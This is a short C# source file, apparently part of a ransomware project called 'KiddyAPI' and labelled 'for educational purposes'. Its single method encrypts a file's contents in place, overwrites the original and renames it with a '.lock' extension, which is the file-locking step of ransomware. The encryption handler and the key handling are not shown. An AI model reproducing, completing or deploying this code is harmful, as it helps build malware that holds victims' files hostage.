/////////////////////////////////////////////////////////
//// Developer : Whiro
//// For for educational purposes
//////////////////////////////////////////////////////////

using System.IO;

namespace KiddyAPI.Crypt
{
    public class Encrypt
    {
        public static void EncryptFile(string file, byte[] key)
        {
            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] bytesEncrypted = Handler.Encrypt(bytesToBeEncrypted, key);
            File.WriteAllBytes(file,bytesEncrypted);
            File.Move(file, file + ".lock");
            
        }
    }
}
